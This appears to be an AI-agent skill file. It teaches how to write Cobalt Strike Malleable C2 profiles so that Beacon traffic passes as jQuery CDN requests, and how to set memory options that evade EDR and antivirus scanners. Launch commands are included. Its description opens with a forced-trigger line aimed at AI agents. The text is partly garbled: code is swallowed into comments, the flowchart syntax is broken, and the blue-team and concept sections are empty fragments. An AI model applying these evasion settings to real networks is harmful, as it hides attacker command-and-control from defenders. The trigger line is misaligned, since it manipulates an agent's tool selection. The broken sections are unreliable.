---
name: cobalt-strike-malleable-c2
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Create and implement Malleable C2 profiles in Cobalt Strike to evade network intrusion 
  detection systems (NIDS/IPS) and endpoint detection architectures. This skill focuses on 
  molding the Beacon's HTTP/HTTPS traffic to resemble legitimate network traffic like Amazon, 
  Google, or jQuery.
domain: cybersecurity
subdomain: red-teaming
category: Evasion
difficulty: expert
estimated_time: "4-5 hours"
mitre_attack:
  tactics: [TA0011, TA0005]
  techniques: [T1071.001, T1027, T1036]
platforms: [windows, network]
tags: [cobalt-strike, malleable-c2, evasion, c2, red-teaming, defense-evasion, opsec]
tools: [cobalt-strike, c2lint]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Cobalt Strike Malleable C2 Defense Evasion

## When to Use
- During red team engagements where network egress filters and deep packet inspection (DPI) appliances intercept communication.
- To bypass threat intelligence feeds that target default Cobalt Strike beacon indicators (e.g., default checksums, empty HTTP headers, known User-Agents).

## Workflow

### Phase 1: Designing the Profile

Profiles define what the HTTP GET/POST requests and responses look like. They utilize blocks like `http-get`, `http-post`, and data manipulation functions (`append`, `prepend`, `base64url`).

```text
# Concept: A snippet to masquerade as jQuery HTTP traffic set sample_name "jQuery Traffic";

http-get {
    set uri "/jquery-3.3.1.min.js";

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Host" "code.jquery.com";
        
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            base64url;
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\n";
            append "\nfunction $(e){return new jQuery(e)}";
            print;
        }
    }
}
```

### Phase 2: Obfuscating Beacon Payload in Memory

Malleable C2 profiles also govern how the payload behaves in host memory (stage 2). This is critical for evading EDR/AV memory scanners.

```text
# stage {
    set userwx "false";          # Avoid RWX memory allocations (RWX is suspicious)
    set obfuscate "true";        # Obfuscate the core beacon DLL in memory
    set cleanup "true";          # Free memory associated with the reflective loader
    set magic_mz_x86 "OOPS";     # Alter the PE MZ header to break signature scanners
    
    transform-x86 {
        prepend "\x90\x90";      # NOP sled prefix
    }
}
```

### Phase 3: Validation (C2lint)

Before restarting your Team Server, you MUST validate your profile syntax.

```bash
# ./c2lint profiles/jquery.profile
```
Ensure there are no errors and that the simulated traffic matches your intended design.

### Phase 4: Implementation

Restart the Cobalt Strike team server pointing to the new profile.

```bash
# ./teamserver <IP> <Password> profiles/jquery.profile
```
Generate new executable beacon payloads (since memory evasion flags change compilation).

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Analyze Target Network ] --> B[Draft Malleable Profile ]
    B --> C[Configure HTTP Blocks ]
    C --> D[Configure EDR Evasion ]
    D --> E[Validate via c2lint ]
    E --> F{Passes Validation? ]}
    F -->|Yes| G[Start Teamserver ]
    F -->|No| H[Debug Profile Syntax ]
```

## 🔵 Blue Team Detection & Defense
- **SSL/TLS Interception (DPI)**: **Memory Scanning via YARA**: **Beacon Jitter and Call Agent Analysis**: Key Concepts
| Concept | Description |
|---------|-------------|
| Sleep and Jitter | |
| Beacon Metadata Encoding | |

## References
- Cobalt Strike Documentation: [Malleable C2](https://www.cobaltstrike.com/help-malleable-c2)
- GitHub Malleable Profiles: [rsmudge/Malleable-C2-Profiles](https://github.com/rsmudge/Malleable-C2-Profiles)
